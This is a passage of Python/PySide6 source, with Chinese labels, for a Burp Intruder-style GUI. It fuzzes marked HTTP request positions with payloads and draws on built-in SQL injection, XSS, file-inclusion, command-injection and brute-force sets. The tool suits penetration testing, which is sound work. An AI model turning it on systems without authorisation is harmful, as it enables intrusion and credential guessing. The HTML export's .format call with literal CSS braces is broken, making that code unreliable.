        stop_btn.setStyleSheet("background: #f44336; color: white;")
        stop_btn.clicked.connect(self._stop_attack)
        
        clear_btn = QPushButton("🗑️ 清空结果")
        clear_btn.clicked.connect(self._clear_results)
        
        export_btn = QPushButton("📤 导出结果")
        export_btn.clicked.connect(self._export_results)
        
        control_layout.addWidget(start_btn)
        control_layout.addWidget(pause_btn)
        control_layout.addWidget(stop_btn)
        control_layout.addWidget(clear_btn)
        control_layout.addWidget(export_btn)
        control_layout.addStretch()
        layout.addLayout(control_layout)
        
        stats_layout = QHBoxLayout()
        self.stats_label = QLabel("就绪")
        self.stats_label.setStyleSheet("padding: 5px; background: #f5f5f5; border-radius: 3px;")
        stats_layout.addWidget(self.stats_label)
        
        self.progress_bar = QProgressBar()
        self.progress_bar.setMaximumHeight(20)
        stats_layout.addWidget(self.progress_bar)
        layout.addLayout(stats_layout)
        
        filter_layout = QHBoxLayout()
        filter_layout.addWidget(QLabel("过滤:"))
        
        self.filter_combo = QComboBox()
        self.filter_combo.addItems(["全部", "仅有趣", "状态码", "错误"])
        filter_layout.addWidget(self.filter_combo)
        
        self.filter_input = QLineEdit()
        self.filter_input.setPlaceholderText("搜索Payload或响应...")
        filter_layout.addWidget(self.filter_input)
        
        apply_filter_btn = QPushButton("应用")
        apply_filter_btn.clicked.connect(self._apply_filter)
        filter_layout.addWidget(apply_filter_btn)
        layout.addLayout(filter_layout)
        
        self.results_table = QTableWidget()
        self.results_table.setColumnCount(8)
        self.results_table.setHorizontalHeaderLabels([
            "#", "Payload", "状态码", "长度", "时间(ms)", "Grep匹配", "备注", "操作"
        ])
        self.results_table.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)
        self.results_table.setSelectionBehavior(QTableWidget.SelectRows)
        self.results_table.setContextMenuPolicy(Qt.CustomContextMenu)
        self.results_table.customContextMenuRequested.connect(self._show_result_context_menu)
        layout.addWidget(self.results_table)
        
        response_splitter = QSplitter(Qt.Vertical)
        
        response_group = QGroupBox("响应详情")
        resp_layout = QVBoxLayout(response_group)
        
        resp_tabs = QTabWidget()
        
        self.response_body = QTextBrowser()
        self.response_body.setFont(QFont("Consolas", 9))
        resp_tabs.addTab(self.response_body, "响应体")
        
        self.response_headers = QTextBrowser()
        self.response_headers.setFont(QFont("Consolas", 9))
        resp_tabs.addTab(self.response_headers, "响应头")
        
        self.response_grep = QTextBrowser()
        self.response_grep.setFont(QFont("Consolas", 9))
        resp_tabs.addTab(self.response_grep, "Grep结果")
        
        resp_layout.addWidget(resp_tabs)
        response_splitter.addWidget(response_group)
        
        layout.addWidget(response_splitter)
        return w
        
    def _auto_detect_positions(self):
        """自动检测位置"""
        request_text = self.request_template.toPlainText()
        if not request_text:
            QMessageBox.warning(None, "警告", "请先输入请求模板")
            return
            
        positions = re.findall(r'§([^§]+)§', request_text)
        
        self.positions_tree.clear()
        for pos in positions:
            item = QTreeWidgetItem([
                pos,
                "参数",
                request_text.split(f"§{pos}§")[0].split("=")[-1].strip()[:20] if "=" in request_text else "",
                "自动检测"
            ])
            self.positions_tree.addTopLevelItem(item)
            
        QMessageBox.information(None, "检测完成", f"检测到 {len(positions)} 个位置:\n" + "\n".join(positions))
        self.log("INFO", f"自动检测到 {len(positions)} 个位置")
        
    def _import_request(self):
        """导入请求"""
        filename, _ = QFileDialog.getOpenFileName(None, "导入HTTP请求", "", "Text Files (*.txt);;All Files (*)")
        if filename:
            try:
                with open(filename, "r", encoding="utf-8", errors="ignore") as f:
                    self.request_template.setText(f.read())
                self.log("INFO", f"导入请求文件: {filename}")
            except Exception as e:
                QMessageBox.critical(None, "错误", f"导入失败: {e}")
                
    def _refresh_positions(self):
        """刷新位置"""
        self._auto_detect_positions()
        
    def _manual_add_position(self):
        """手动添加位置"""
        from PySide6.QtWidgets import QInputDialog
        name, ok = QInputDialog.getText(None, "添加位置", "位置名称:")
        if ok and name:
            item = QTreeWidgetItem([name, "手动添加", "", "用户添加"])
            self.positions_tree.addTopLevelItem(item)
            self.log("INFO", f"手动添加位置: {name}")
            
    def _clear_positions(self):
        """清除所有位置"""
        self.positions_tree.clear()
        self.log("INFO", "清除所有位置")
        
    def _add_payload_set(self):
        """添加Payload集合"""
        from PySide6.QtWidgets import QInputDialog
        name, ok = QInputDialog.getText(None, "添加Payload集合", "集合名称:")
        if ok and name:
            self._payload_sets[name] = PayloadSet(name=name, payloads=[])
            self.payload_sets_list.addItem(name)
            self.log("INFO", f"添加Payload集合: {name}")
            
    def _remove_payload_set(self):
        """删除Payload集合"""
        current = self.payload_sets_list.currentItem()
        if current:
            name = current.text()
            del self._payload_sets[name]
            self.payload_sets_list.takeItem(self.payload_sets_list.row(current))
            self.log("INFO", f"删除Payload集合: {name}")
            
    def _load_payload_file(self):
        """加载Payload文件"""
        filename, _ = QFileDialog.getOpenFileName(None, "加载Payload文件", "", "Text Files (*.txt);;All Files (*)")
        if filename:
            try:
                with open(filename, "r", encoding="utf-8", errors="ignore") as f:
                    payloads = [line.strip() for line in f if line.strip()]
                    
                self.payload_editor.setText("\n".join(payloads))
                self.payload_count_label.setText(f"数量: {len(payloads)}")
                self.log("INFO", f"加载 {len(payloads)} 个Payload从文件: {filename}")
            except Exception as e:
                QMessageBox.critical(None, "错误", f"加载失败: {e}")
                
    def _show_builtin_payloads(self):
        """显示内置Payload"""
        dialog = QDialog()
        dialog.setWindowTitle("内置Payload集合")
        dialog.setMinimumSize(500, 400)
        layout = QVBoxLayout(dialog)
        
        builtin_list = QListWidget()
        builtin_items = [
            ("SQL注入 - 基础", self._sqli_payloads[:10]),
            ("SQL注入 - 完整", self._sqli_payloads),
            ("XSS - 基础", self._xss_payloads[:6]),
            ("XSS - 完整", self._xss_payloads),
            ("本地文件包含", self._lfi_payloads),
            ("命令注入", self._command_injection_payloads),
            ("暴力破解 - 常见用户名/密码", [f"{u}:{p}" for u, p in self._auth_payloads]),
            ("模糊测试 - 特殊字符", self._fuzzing_chars),
        ]
        
        for name, payloads in builtin_items:
            item = QListWidgetItem(f"{name} ({len(payloads)} 个)")
            item.setData(Qt.UserRole, payloads)
            builtin_list.addItem(item)
            
        load_btn = QPushButton("加载选中")
        load_btn.clicked.connect(lambda: self._load_selected_builtin(builtin_list))
        
        layout.addWidget(QLabel("选择要加载的内置Payload集合:"))
        layout.addWidget(builtin_list)
        layout.addWidget(load_btn)
        dialog.exec()
        
    def _load_selected_builtin(self, builtin_list):
        """加载选中的内置Payload"""
        current = builtin_list.currentItem()
        if current:
            payloads = current.data(Qt.UserRole)
            self.payload_editor.setText("\n".join(payloads))
            self.payload_count_label.setText(f"数量: {len(payloads)}")
            self.log("INFO", f"加载内置Payload: {current.text()}")
            
    def _generate_payloads(self):
        """生成Payloads"""
        payload_type = self.payload_type_combo.currentText()
        payloads = []
        
        if payload_type == PayloadType.NUMBER_RANGE.value:
            for i in range(1, 101):
                payloads.append(str(i))
        elif payload_type == PayloadType.CHARACTER_FUZZ.value:
            for c in "abcdefghijklmnopqrstuvwxyz0123456789":
                payloads.append(c)
                payloads.append(c * 2)
                payloads.append(c * 3)
        elif payload_type == PayloadType.RANDOM.value:
            for _ in range(50):
                payloads.append("".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=8)))
        elif payload_type == PayloadType.DATE.value:
            from datetime import datetime, timedelta
            base = datetime.now()
            for i in range(-30, 31):
                date = base + timedelta(days=i)
                payloads.append(date.strftime("%Y-%m-%d"))
                
        if payloads:
            self.payload_editor.setText("\n".join(payloads))
            self.payload_count_label.setText(f"数量: {len(payloads)}")
            self.log("INFO", f"生成 {len(payloads)} 个Payload ({payload_type})")
            
    def _add_processing_rule(self):
        """添加处理规则"""
        dialog = QDialog()
        dialog.setWindowTitle("添加处理规则")
        layout = QFormLayout(dialog)
        
        rule_type = QComboBox()
        rule_type.addItems([
            "uppercase", "lowercase", "base64_encode", "md5_hash", 
            "sha1_hash", "url_encode", "prefix", "suffix", 
            "add_null_byte", "remove_null_byte"
        ])
        layout.addRow("规则类型:", rule_type)
        
        value_input = QLineEdit()
        value_input.setPlaceholderText("前缀/后缀值 (如适用)")
        layout.addRow("值:", value_input)
        
        if dialog.exec():
            rule = {"type": rule_type.currentText()}
            if value_input.text():
                rule["value"] = value_input.text()
                
            self.processing_rules_list.addItem(f"{rule['type']}" + (f" ({rule.get('value', '')})" if "value" in rule else ""))
            self.log("INFO", f"添加处理规则: {rule['type']}")
            
    def _remove_processing_rule(self):
        """删除处理规则"""
        current = self.processing_rules_list.currentRow()
        if current >= 0:
            self.processing_rules_list.takeItem(current)
            self.log("INFO", "删除处理规则")
            
    def _add_match_rule(self):
        """添加匹配规则"""
        dialog = QDialog()
        dialog.setWindowTitle("添加Grep规则")
        dialog.setMinimumSize(400, 300)
        layout = QFormLayout(dialog)
        
        name_input = QLineEdit()
        name_input.setPlaceholderText("规则名称")
        layout.addRow("名称:", name_input)
        
        match_type = QComboBox()
        match_type.addItems([mt.value for mt in MatchType])
        layout.addRow("匹配类型:", match_type)
        
        pattern_input = QLineEdit()
        pattern_input.setPlaceholderText("匹配模式")
        layout.addRow("模式:", pattern_input)
        
        negative_cb = QCheckBox("反向匹配 (不匹配时标记)")
        layout.addRow(negative_cb)
        
        case_sensitive_cb = QCheckBox("区分大小写")
        layout.addRow(case_sensitive_cb)
        
        if dialog.exec():
            rule = MatchRule(
                name=name_input.text() or f"规则{len(self._match_rules)+1}",
                match_type=list(MatchType)[match_type.currentIndex()],
                pattern=pattern_input.text(),
                is_negative=negative_cb.isChecked(),
                case_sensitive=case_sensitive_cb.isChecked()
            )
            self._match_rules.append(rule)
            self.match_rules_list.addItem(f"{rule.name} ({rule.match_type.value}: {rule.pattern[:30]}...)")
            self.log("INFO", f"添加Grep规则: {rule.name}")
            
    def _remove_match_rule(self):
        """删除匹配规则"""
        current = self.match_rules_list.currentRow()
        if current >= 0:
            self.match_rules_list.takeItem(current)
            if current < len(self._match_rules):
                del self._match_rules[current]
            self.log("INFO", "删除Grep规则")
            
    def _load_preset_rules(self):
        """加载预设规则"""
        presets = [
            MatchRule("状态码200", MatchType.STATUS_CODE, "200"),
            MatchRule("状态码500", MatchType.STATUS_CODE, "500"),
            MatchRule("响应包含SQL错误", MatchType.TEXT, "SQL syntax", case_sensitive=False),
            MatchRule("响应包含XSS", MatchType.TEXT, "<script>", case_sensitive=False),
            MatchRule("响应时间>5秒", MatchType.RESPONSE_TIME, "5000"),
            MatchRule("响应长度异常", MatchType.RESPONSE_LENGTH, "0-100"),
        ]
        
        for rule in presets:
            self._match_rules.append(rule)
            self.match_rules_list.addItem(f"{rule.name} ({rule.match_type.value}: {rule.pattern[:30]}...)")
            
        self.log("INFO", f"加载 {len(presets)} 个预设Grep规则")
        
    def _start_attack(self):
        """开始攻击"""
        request_text = self.request_template.toPlainText()
        if not request_text:
            QMessageBox.warning(None, "警告", "请先输入请求模板")
            return
            
        mode_index = self.mode_group.checkedId()
        mode = list(AttackMode)[mode_index]
        
        payloads_text = self.payload_editor.toPlainText()
        payloads = [p.strip() for p in payloads_text.split("\n") if p.strip()]
        
        if not payloads:
            QMessageBox.warning(None, "警告", "请至少添加一个Payload")
            return
            
        positions = re.findall(r'§([^§]+)§', request_text)
        if not positions:
            QMessageBox.warning(None, "警告", "请在请求模板中使用 §位置名§ 标记位置")
            return
            
        payload_sets = {}
        for pos in positions:
            payload_sets[pos] = PayloadSet(name=pos, payloads=payloads)
            
        config = {
            "mode": mode,
            "request_template": request_text,
            "payload_sets": payload_sets,
            "match_rules": self._match_rules,
            "delay_ms": self.delay_spin.value(),
            "threads": self.thread_count.value(),
            "timeout": self.timeout_spin.value(),
            "follow_redirects": self.follow_redirects.isChecked(),
        }
        
        self._worker = IntruderWorker(config)
        self._worker.progress_updated.connect(self._on_progress_updated)
        self._worker.result_found.connect(self._on_result_found)
        self._worker.log_message.connect(lambda msg: self.log("INFO", msg))
        self._worker.attack_finished.connect(self._on_attack_finished)
        self._worker.error_occurred.connect(lambda err: self.log("ERROR", err))
        self._worker.status_changed.connect(self._on_status_changed)
        
        self._results.clear()
        self.results_table.setRowCount(0)
        self._worker.start()
        
        self.log("INFO", f"开始攻击 - 模式: {mode.value}")
        
    def _pause_attack(self):
        """暂停攻击"""
        if self._worker and self._worker.isRunning():
            if self._worker._paused:
                self._worker.resume()
            else:
                self._worker.pause()
                
    def _stop_attack(self):
        """停止攻击"""
        if self._worker and self._worker.isRunning():
            self._worker.stop()
            self._worker.wait()
            self.log("INFO", "攻击已停止")
            
    def _clear_results(self):
        """清空结果"""
        self._results.clear()
        self.results_table.setRowCount(0)
        self.progress_bar.setValue(0)
        self.stats_label.setText("就绪")
        self.log("INFO", "结果已清空")
        
    def _export_results(self):
        """导出结果"""
        if not self._results:
            QMessageBox.warning(None, "警告", "没有结果可导出")
            return
            
        filename, _ = QFileDialog.getSaveFileName(None, "导出结果", "", "CSV Files (*.csv);;JSON Files (*.json);;HTML Files (*.html)")
        if filename:
            try:
                if filename.endswith(".csv"):
                    self._export_csv(filename)
                elif filename.endswith(".json"):
                    self._export_json(filename)
                elif filename.endswith(".html"):
                    self._export_html(filename)
                self.log("INFO", f"导出结果到: {filename}")
                QMessageBox.information(None, "成功", f"结果已导出到:\n{filename}")
            except Exception as e:
                QMessageBox.critical(None, "错误", f"导出失败: {e}")
                
    def _export_csv(self, filename):
        """导出CSV"""
        import csv
        with open(filename, "w", newline="", encoding="utf-8") as f:
            writer = csv.writer(f)
            writer.writerow(["#", "Payload", "状态码", "长度", "时间(ms)", "有趣", "错误"])
            for r in self._results:
                writer.writerow([
                    r.id,
                    str(r.payloads),
                    r.status_code,
                    r.length,
                    f"{r.time_ms:.1f}",
                    r.is_interesting,
                    r.error
                ])
                
    def _export_json(self, filename):
        """导出JSON"""
        import json
        data = []
        for r in self._results:
            data.append({
                "id": r.id,
                "payloads": r.payloads,
                "status_code": r.status_code,
                "length": r.length,
                "time_ms": r.time_ms,
                "is_interesting": r.is_interesting,
                "error": r.error
            })
        with open(filename, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
            
    def _export_html(self, filename):
        """导出HTML"""
        html = """
        <html>
        <head>
            <title>攻击结果报告</title>
            <style>
                body { font-family: Arial, sans-serif; margin: 20px; }
                table { border-collapse: collapse; width: 100%; }
                th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
                th { background-color: #4CAF50; color: white; }
                tr:nth-child(even) { background-color: #f2f2f2; }
                .interesting { background-color: #ffeb3b !important; }
            </style>
        </head>
        <body>
            <h1>攻击结果报告</h1>
            <p>生成时间: {timestamp}</p>
            <table>
                <tr>
                    <th>#</th><th>Payload</th><th>状态码</th><th>长度</th>
                    <th>时间(ms)</th><th>有趣</th>
                </tr>
        """.format(timestamp=datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
        
        for r in self._results:
            css_class = "interesting" if r.is_interesting else ""
            html += f"""
                <tr class="{css_class}">
                    <td>{r.id}</td>
                    <td>{str(r.payloads)}</td>
                    <td>{r.status_code}</td>
                    <td>{r.length}</td>
                    <td>{r.time_ms:.1f}</td>
                    <td>{"✅" if r.is_interesting else ""}</td>
                </tr>
            """
            
        html += """
            </table>
        </body>
        </html>
        """
        
        with open(filename, "w", encoding="utf-8") as f:
            f.write(html)
            
    def _apply_filter(self):
        """应用过滤"""
        filter_type = self.filter_combo.currentText()
        filter_text = self.filter_input.text().lower()
        
        self.results_table.setRowCount(0)
        for r in self._results:
            if filter_type == "仅有趣" and not r.is_interesting:
                continue
            if filter_type == "错误" and not r.error:
                continue
            if filter_text and filter_text not in str(r.payloads).lower() and filter_text not in r.response.lower():
                continue
                
            self._add_result_to_table(r)
            
    def _show_result_context_menu(self, position):
        """显示结果右键菜单"""
        from PySide6.QtWidgets import QMenu
        menu = QMenu()
        
        view_action = menu.addAction("👁️ 查看响应")
        compare_action = menu.addAction("🔍 对比基准")
        copy_action = menu.addAction("📋 复制Payload")
        resend_action = menu.addAction("🔄 重放请求")
        
        action = menu.exec(self.results_table.mapToGlobal(position))
        
        if action == view_action:
            row = self.results_table.rowAt(position.y())
            if row >= 0 and row < len(self._results):
                self._show_response_detail(self._results[row])
        elif action == copy_action:
            row = self.results_table.rowAt(position.y())
            if row >= 0 and row < len(self._results):
                from PySide6.QtWidgets import QApplication
                QApplication.clipboard().setText(str(self._results[row].payloads))
                
    def _on_progress_updated(self, current, total, message):
        """进度更新"""
        self.progress_bar.setMaximum(total)
        self.progress_bar.setValue(current)
        self.stats_label.setText(f"{current}/{total} - {message}")
        
    def _on_result_found(self, result):
        """发现结果"""
        self._results.append(result)
        self._add_result_to_table(result)
        
    def _add_result_to_table(self, result):
        """添加结果到表格"""
        row = self.results_table.rowCount()
        self.results_table.insertRow(row)
        
        payload_str = ", ".join(f"{k}={v[:20]}" for k, v in result.payloads.items())
        
        self.results_table.setItem(row, 0, QTableWidgetItem(str(result.id)))
        self.results_table.setItem(row, 1, QTableWidgetItem(payload_str))
        self.results_table.setItem(row, 2, QTableWidgetItem(str(result.status_code)))
        self.results_table.setItem(row, 3, QTableWidgetItem(str(result.length)))
        self.results_table.setItem(row, 4, QTableWidgetItem(f"{result.time_ms:.1f}"))
        
        grep_str = ", ".join(g.rule_name for g in result.grep_results if g.matched)
        self.results_table.setItem(row, 5, QTableWidgetItem(grep_str))
        
        status_text = ""
        if result.is_interesting:
            status_text = "⭐ 有趣"
        if result.error:
            status_text = f"❌ {result.error}"
        self.results_table.setItem(row, 6, QTableWidgetItem(status_text))
        
        view_btn = QPushButton("👁️")
        view_btn.clicked.connect(lambda: self._show_response_detail(result))
        self.results_table.setCellWidget(row, 7, view_btn)
        
        if result.is_interesting:
            for col in range(8):
                item = self.results_table.item(row, col)
                if item:
                    item.setBackground(QColor("#fff3cd"))
                    
    def _on_attack_finished(self, stats):
        """攻击完成"""
        self.progress_bar.setValue(self.progress_bar.maximum())
        self.stats_label.setText(
            f"完成! {stats.completed_requests} 请求, "
            f"{stats.interesting_results} 有趣结果, "
            f"{stats.requests_per_second:.1f} req/s"
        )
        self.log("INFO", f"攻击完成: {stats.completed_requests} 请求, {stats.interesting_results} 有趣结果")
        
    def _on_status_changed(self, status):
        """状态改变"""
        self.stats_label.setText(status)
        
    def _show_response_detail(self, result):
        """显示响应详情"""
        self.response_body.setText(result.response)
        self.response_headers.setText(result.response_headers)
        
        grep_text = ""
        for g in result.grep_results:
            grep_text += f"规则: {g.rule_name}\n"
            grep_text += f"匹配: {'✅' if g.matched else '❌'}\n"
            if g.match_value:
                grep_text += f"值: {g.match_value}\n"
            grep_text += "\n"
        self.response_grep.setText(grep_text)
        
    def get_results(self) -> List[AttackResult]:
        """获取结果"""
        return self._results.copy()
        
    def get_stats(self) -> Dict[str, Any]:
        """获取统计"""
        return {
            "total_results": len(self._results),
            "interesting_results": sum(1 for r in self._results if r.is_interesting),
            "failed_results": sum(1 for r in self._results if r.error),
        }
